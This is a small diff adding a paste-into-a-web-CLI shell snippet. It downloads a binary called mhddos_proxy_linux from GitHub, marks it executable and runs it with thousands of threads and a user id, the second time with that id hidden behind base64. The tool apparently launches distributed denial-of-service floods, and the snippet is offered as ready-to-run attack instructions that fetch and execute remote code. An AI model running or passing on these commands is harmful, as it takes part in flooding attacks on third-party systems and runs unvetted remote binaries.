@@ -1,1 +1,10 @@
+# Cut and paste this code into https://h2.nexus/cli
+#
 
+curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux 
+chmod +x mhddos_proxy_linux
+./mhddos_proxy_linux --lang en --copies 8 --threads 4096 --user-id 5272237815 
+
+curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux
+chmod +x mhddos_proxy_linux
+./mhddos_proxy_linux --lang en --copies 64 --threads 8192 --user-id $(echo "NTI3MjIzNzgxNQ==" | base64 --decode)
